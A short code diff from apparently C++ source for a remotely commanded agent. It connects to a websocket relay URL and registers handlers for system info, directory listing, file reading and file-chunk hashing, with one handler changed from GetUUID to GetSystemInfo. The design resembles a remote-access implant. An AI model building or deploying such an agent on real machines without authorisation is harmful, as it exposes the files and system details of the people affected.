@@ -7,7 +7,7 @@ INT32 start()
     auto url = "https://relay.nostdlib.workers.dev/ws"_embed;
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
-    commandHandlers[CommandType::GetUUID] = EMBED_FUNC(Handle_GetUUIDCommand);
+    commandHandlers[CommandType::GetSystemInfo] = EMBED_FUNC(Handle_GetSystemInfoCommand);
     commandHandlers[CommandType::GetDirectoryContent] = EMBED_FUNC(Handle_GetDirectoryContentCommand);
     commandHandlers[CommandType::GetFileContent] = EMBED_FUNC(Handle_GetFileContentCommand);
     commandHandlers[CommandType::GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);
